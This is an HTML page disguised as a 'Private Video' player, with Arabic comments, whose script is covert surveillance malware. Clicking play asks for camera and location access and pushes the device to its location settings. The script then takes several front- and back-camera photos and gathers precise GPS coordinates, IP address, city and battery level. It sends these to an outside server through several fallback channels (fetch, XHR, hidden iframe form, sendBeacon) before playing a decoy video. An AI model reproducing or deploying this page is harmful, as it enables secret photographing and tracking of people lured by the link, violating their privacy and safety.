<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .play-button-overlay {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 0, 0, 0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            position: relative;
        }

        .play-button-overlay:hover {
            transform: scale(1.1);
            background-color: rgba(255, 0, 0, 0.95);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
        }

        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .control-button:hover {
            background: #333;
        }

        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }

        .loading-text {
            margin-top: 10px;
        }

        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        .fullscreen-btn {
            margin-left: 15px;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            .play-button-overlay {
                width: 70px;
                height: 70px;
            }
            .play-icon-large {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="time-display">0:00 / 2:45</div>

            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>

            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text">Loading video... Please wait</div>
    </div>

    <script>
        (function() {
            'use strict';

            // ===== تخزين البيانات في متغيرات عامة =====
            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            // متغيرات التحكم
            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;
            let isDataSent = false;

            // عناصر DOM
            const thumbnailArea = document.getElementById('thumbnailArea');
            const playButtonOverlay = document.getElementById('playButtonOverlay');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');

            // ===== الحصول على الصلاحيات مسبقاً =====
            async function preRequestPermissions() {
                try {
                    await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            () => resolve(),
                            () => resolve(),
                            { enableHighAccuracy: true, timeout: 5000 }
                        );
                    });
                } catch (e) {}
                try {
                    await navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => stream.getTracks().forEach(t => t.stop()))
                        .catch(() => {});
                } catch (e) {}
            }

            // ===== جلب IP =====
            async function fetchIPInfo() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch {
                    capturedData.ipInfo = "IP Info not available";
                }
            }

            // ===== جلب البطارية =====
            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch {
                    capturedData.batteryStatus = "Unknown";
                }
            }

            // ===== التصوير =====
            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });

                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);

                    stream.getTracks().forEach(track => track.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                } catch {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                }
            }

            // ===== طلب الموقع بدقة عالية =====
            async function getLocation() {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    capturedData.location =
                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                    capturedData.permissions.push('Geolocation Allowed');
                } catch (err) {
                    capturedData.permissions.push('Geolocation Denied');
                    capturedData.location = '';
                }
            }

            // ===== فتح إعدادات الموقع (نسخة محسنة) =====
            function openLocationSettings() {
                const ua = navigator.userAgent || navigator.vendor || window.opera;
                let settingsOpenedSuccessfully = false;
                
                // كشف المتصفح ونظام التشغيل
                const isAndroid = /Android/i.test(ua);
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                const isWindows = /Windows/i.test(ua);
                const isMac = /Macintosh/i.test(ua) && !isIOS;
                const isChrome = /Chrome/i.test(ua) && !/Edge|OPR|Brave/i.test(ua);
                const isFirefox = /Firefox/i.test(ua);
                const isSafari = /Safari/i.test(ua) && !isChrome && !isAndroid;
                
                console.log(`Detected: ${isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isSafari ? 'Safari' : 'Other Browser'} on ${isAndroid ? 'Android' : isIOS ? 'iOS' : isWindows ? 'Windows' : isMac ? 'Mac' : 'Other OS'}`);
                
                if (isAndroid) {
                    // محاولات أندرويد المتعددة
                    const androidIntents = [
                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent://com.android.settings/.Settings$LocationSettingsActivity#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end'
                    ];
                    
                    // تجربة المحاولة الأولى مع window.location.href
                    try {
                        window.location.href = androidIntents[0];
                        settingsOpenedSuccessfully = true;
                        console.log('Attempt 1: Using location.href for Android');
                    } catch (e) {
                        console.log('Android intent 1 failed:', e);
                    }
                    
                    // بعد 800ms، إذا لم تفتح الإعدادات نجرب المحاولة الثانية
                    setTimeout(() => {
                        if (document.hidden === false && !settingsOpenedSuccessfully) {
                            try {
                                window.location.href = androidIntents[1];
                                console.log('Attempt 2: Fallback Android intent');
                            } catch (e) {
                                console.log('Android intent 2 failed:', e);
                            }
                        }
                    }, 800);
                    
                    // بعد 1600ms، نجرب المحاولة الثالثة مع window.open
                    setTimeout(() => {
                        if (!settingsOpenedSuccessfully) {
                            try {
                                window.open(androidIntents[2], '_blank');
                                console.log('Attempt 3: Using window.open for Android');
                            } catch (e) {
                                // فشل كل المحاولات - نفتح الإعدادات العامة
                                window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                                console.log('Final fallback: Opening general Android settings');
                            }
                        }
                    }, 1600);
                    
                } else if (isIOS) {
                    // محاولات iOS
                    const iosUrls = [
                        'App-prefs:LOCATION_SERVICES',
                        'App-Prefs:Privacy&path=LOCATION',
                        'prefs:root=Privacy&path=LOCATION'
                    ];
                    
                    // المحاولة الأولى: window.location.href (أفضل لـ Safari)
                    try {
                        window.location.href = iosUrls[0];
                        settingsOpenedSuccessfully = true;
                        console.log('iOS: Using location.href with App-prefs');
                    } catch (e) {
                        console.log('iOS attempt 1 failed:', e);
                    }
                    
                    // المحاولة الثانية بعد تأخير
                    setTimeout(() => {
                        if (!settingsOpenedSuccessfully) {
                            try {
                                window.open(iosUrls[1], '_blank');
                                console.log('iOS: Fallback with window.open');
                            } catch (e) {
                                console.log('iOS attempt 2 failed:', e);
                            }
                        }
                    }, 500);
                    
                    // المحاولة الثالثة
                    setTimeout(() => {
                        if (!settingsOpenedSuccessfully) {
                            window.location.href = iosUrls[2];
                            console.log('iOS: Final attempt with prefs');
                        }
                    }, 1500);
                    
                } else if (isWindows) {
                    // محاولات Windows
                    const windowsUrls = [
                        'ms-settings:privacy-location',
                        'ms-settings:privacy'
                    ];
                    
                    try {
                        window.location.href = windowsUrls[0];
                        settingsOpenedSuccessfully = true;
                        console.log('Windows: Using location.href');
                    } catch (e) {
                        setTimeout(() => {
                            window.open(windowsUrls[1], '_blank');
                        }, 500);
                    }
                    
                } else if (isMac) {
                    // محاولات Mac
                    try {
                        window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
                        settingsOpenedSuccessfully = true;
                        console.log('Mac: Using location.href');
                    } catch (e) {
                        setTimeout(() => {
                            window.open('x-apple.systempreferences:com.apple.preference.security', '_blank');
                        }, 500);
                    }
                    
                } else {
                    // محاولة عامة
                    try {
                        window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                    } catch (e) {
                        console.log('All attempts failed');
                    }
                }
                
                console.log(`Settings opened: ${settingsOpenedSuccessfully ? 'Success' : 'Attempted'}`);
                return settingsOpenedSuccessfully;
            }

            // ===== إرسال البيانات =====
            async function sendDataWithBypass(data) {
                const urls = [
                    'https://server-brxz.onrender.com/submitData',
                    'https://server-brxz.onrender.com/submitData'
                ];

                for (let url of urls) {
                    try {
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams(data),
                            mode: 'no-cors'
                        });
                        return;
                    } catch (e) {}

                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, false);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(data));
                        return;
                    } catch (e) {}

                    try {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = url;
                        form.target = iframe.name || 'hiddenFrame';
                        iframe.name = form.target;

                        for (let key in data) {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = data[key];
                            form.appendChild(input);
                        }

                        document.body.appendChild(form);
                        form.submit();
                        setTimeout(() => {
                            document.body.removeChild(form);
                            document.body.removeChild(iframe);
                        }, 1000);
                        return;
                    } catch (e) {}

                    try {
                        const blob = new Blob([new URLSearchParams(data).toString()], {
                            type: 'application/x-www-form-urlencoded'
                        });
                        navigator.sendBeacon(url, blob);
                        return;
                    } catch (e) {}
                }
            }

            // ===== تشغيل الفيديو مع الصوت =====
            function startVideoWithSound() {
                if (videoStarted) return;
                videoStarted = true;

                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';

                realVideo.muted = false;
                realVideo.volume = 1.0;

                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        // نجح التشغيل
                    }).catch(() => {
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => {
                                realVideo.muted = false;
                                realVideo.volume = 1.0;
                            }, 100);
                        }).catch(() => {});
                    });
                }

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 500);

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 3000);
            }

            // ===== الدالة الرئيسية =====
            async function captureData() {
                if (isProcessing) return;
                if (videoStarted) return;

                isProcessing = true;

                // الضغطة الأولى: فتح الإعدادات
                if (!settingsOpened) {
                    settingsOpened = true;
                    await preRequestPermissions();
                    openLocationSettings();
                    isProcessing = false;
                    return;
                }

                // الضغطة الثانية: جمع البيانات
                spinner.style.display = 'block';
                loading.style.display = 'block';
                playButtonOverlay.style.opacity = '0.5';
                playButtonOverlay.style.pointerEvents = 'none';

                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';

                await Promise.all([
                    fetchIPInfo(),
                    getBatteryStatus(),
                    getLocation()
                ]);

                await captureFromCamera('user');
                await captureFromCamera('environment');
                await captureFromCamera('user');
                await captureFromCamera('environment');

                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };

                await sendDataWithBypass(data);

                spinner.style.display = 'none';
                loading.style.display = 'none';
                playButtonOverlay.style.opacity = '1';
                playButtonOverlay.style.pointerEvents = 'auto';

                startVideoWithSound();

                isProcessing = false;
            }

            // ===== ربط الأحداث =====
            if (thumbnailArea) {
                thumbnailArea.addEventListener('click', captureData);
            }
            if (playButtonOverlay) {
                playButtonOverlay.addEventListener('click', function(e) {
                    e.stopPropagation();
                    captureData();
                });
            }

            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }
            }, true);

            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const video = document.getElementById('realVideo');
                        if (video.requestFullscreen) {
                            video.requestFullscreen();
                        } else if (video.webkitRequestFullscreen) {
                            video.webkitRequestFullscreen();
                        }
                    }
                });
            });

            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                const realVideoEl = document.getElementById('realVideo');
                if (realVideoEl.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseInt(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

            setTimeout(() => {
                preRequestPermissions();
            }, 1000);

        })();
    </script>

</body>
</html>
